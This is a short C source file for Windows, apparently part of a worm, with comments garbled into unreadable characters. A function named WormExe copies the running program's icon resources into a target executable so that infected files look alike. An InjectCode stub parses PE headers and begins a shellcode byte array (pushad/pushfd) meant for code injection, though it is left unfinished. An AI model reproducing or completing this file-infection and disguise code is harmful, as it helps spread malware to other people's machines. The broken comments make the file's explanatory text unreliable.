#include "Global.h"

//�޸�ָ����ִ���ļ�exeͼ��
void WormExe(char *szObjExePath)
{
	//��ȡ��ǰ���̿�ִ���ļ�exe·��
	//��ִ���ļ���exe��, ���ļ���dll��
	TCHAR szCurrentExePath[MAX_PATH];

	GetModuleFileName(
					NULL,				//ָ�������ص�ģ����
					szCurrentExePath,	//�洢ģ��·���Ļ�����
					MAX_PATH);			//��������С

	//�滻ͼ��
	SetExeIcon(szCurrentExePath, szObjExePath);

}

//�޸�ͼ��
BOOL SetExeIcon(char* szCurrentExePath, char* szObjExePath)
{
	//����ǰģ����ص����̵�ַ�ռ�
	HMODULE hExe = LoadLibrary(szCurrentExePath);

	if (hExe == NULL)
	{
		return FALSE;
	}

	//ö�ٶ�����ģ��ָ��������Դ
	EnumResourceNames(
		hExe,				//ģ����
		RT_ICON,			//ö����Դ������
		EnumIconProc,		//ö����Դ���ص�����
		(LONG)szObjExePath	//���ݸ��ص������Ĳ���ֵ
		);

	return TRUE;
}

//ö����Դ���ص�����
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG lParam)
{
	//������Դ
	HRSRC hRes = FindResource(
				hModule,	//��ִ���ļ�ģ����
				lpszName,	//��Դ����
				RT_ICON		//��Դ������
		);

	if (hRes == NULL)
	{
		return FALSE;
	}

	HGLOBAL hResLoad = LoadResource(
		hModule,	//��ִ���ļ�ģ����
		hRes		//��Դ���
		);

	if (hResLoad == NULL)
		return FALSE;

	//������Դ
	LPVOID pData = LockResource(hResLoad);
	if (pData == NULL)
		return FALSE;

	//��ȡ��Դ�Ĵ�С
	DWORD dwSize = SizeofResource(hModule,	//��ִ���ļ�ģ����
				  hRes);					//��Դ���

	if (lParam)
	{
		SetRes((LPSTR)lParam, RT_ICON, lpszName, pData, dwSize);
	}

	return TRUE;
}

//������Դ
BOOL SetRes(LPSTR szObjFileName, LPSTR szResType, LPSTR szResName, LPVOID pData, DWORD cbData)
{

	HANDLE hExe = BeginUpdateResource(
				szObjFileName,	//����ָ���Ķ������ļ�
				FALSE			//���ΪTRUE��ɾ��������Դ��
		);

	if (hExe == NULL)
		return FALSE;

	int nRet = UpdateResource(
			hExe,		//Ҫ���µ�exe�ļ�
			szResType,	//Ҫ���µ���Դ����
			szResName,	//Ҫ���µ���Դ����
			MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),//��Ҫ���µ����Ա�ʶ��
			pData,		//ͼ����Դ����
			cbData		//��Դ���ݵĴ�С
				);

	if (!nRet)
		return FALSE;

	EndUpdateResource(
				hExe,	//ģ����
				FALSE	//�Ƿ񽫸��µ���Դд���ļ���TRUE:�������κ��޸ģ�FALSE:�޸Ľ���Դ����
				);


	return TRUE;
}

//ע��
BOOL InjectCode(char* szObjExePath)
{
	PIMAGE_DOS_HEADER pImageDosHeader;
	PIMAGE_NT_HEADERS pImageNtHeader;
	PIMAGE_SECTION_HEADER pImageSectionHeader;

	unsigned char thuncode[] = "\x60\x9c";
	return TRUE;
}